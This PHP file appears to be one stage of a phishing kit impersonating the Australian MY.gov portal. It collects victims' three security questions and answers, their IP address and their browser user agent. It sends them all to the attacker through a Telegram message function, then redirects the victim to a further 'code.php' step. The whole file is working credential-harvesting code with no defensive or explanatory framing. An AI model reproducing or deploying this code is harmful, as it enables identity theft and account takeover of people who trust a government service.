<?php
include("config/config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
            $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $q1 = $_POST['q1'];
    $a1 = $_POST['a1'];
    $q2 = $_POST['q2'];
    $a2 = $_POST['a2'];
    $q3 = $_POST['q3'];
    $a3 = $_POST['a3'];
    $serv = $_REQUEST['ques'];


        //Telegram send
        $message = "**MY.gov-Questions\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "QUESTION1: ".$_POST['q1']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ANSWER1: ".$_POST['a1']."\n";
        $message .= "----------------------------------------\n";
        $message .= "QUESTION2: ".$_POST['q2']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ANSWER2: ".$_POST['a2']."\n";
        $message .= "----------------------------------------\n";
        $message .= "QUESTION3: ".$_POST['q3']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ANSWER3: ".$_POST['a3']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Output
        header("location:code.php");
?>
